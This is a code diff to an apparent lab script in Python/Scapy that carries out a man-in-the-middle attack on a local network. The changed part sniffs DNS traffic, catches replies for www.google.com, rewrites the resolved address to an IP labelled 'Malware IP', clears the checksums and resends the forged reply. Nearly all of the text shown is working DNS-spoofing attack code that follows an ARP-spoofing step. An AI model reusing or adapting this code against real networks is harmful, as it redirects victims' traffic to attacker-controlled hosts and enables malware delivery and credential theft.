@@ -5,7 +5,7 @@ ipM1 = "192.168.56.101" #  Rename to IPAttacker?
 ipM2 = "192.168.56.102"
 ipM3 = "192.168.56.103" # IPVictim?
 ipMal = "50.63.7.226"   # Malware IP
-trapUrl = 'google.com'
+trapUrl = "www.google.com"
 ipTrap = "142.251.32.100"
 
 def ARP_spoofing():
@@ -31,7 +31,7 @@ def ARP_spoofing():
 
 # DNS-Spoof Attack
 def dns_spoof_attack():
-    packets = sniff(filter='udp port 53', count=10, prn=process_packet)
+    packets = sniff(filter='udp port 53', count=2, prn=process_packet)
     # for packet in packets:
     #     if packet.haslayer(DNS):
     #         dns_packet = packet[DNS]
@@ -46,15 +46,19 @@ def process_packet(packet):
         ip_packet = packet[IP]
         udp_packet = packet[UDP]
         dns_packet = packet[DNS]
-
         destination_ip = ip_packet.dst
         destination_port = udp_packet.dport
-
-        dns_packet.show()
-        if destination_ip == ipTrap:
+        
+        # if ip_packet.dst = ipTrap:
+        if trapUrl in dns_packet.qd.qname:
+            dns_packet.show()
             print("DNS packet with destination IP " + trapUrl + " found!")
-            print("Source IP: ", ip_packet.src)
-            print("Source Port: ", udp_packet.sport)
+            if (dns_packet.qr == 1):
+                print("Response Data: " + dns_packet.an.rdata)
+                dns_packet.an.rdata = ipMal
+                del packet[IP].chksum
+                del packet[UDP].chksum
+                send(packet, verbose=False)
 
             # Display complete DNS packet information
             
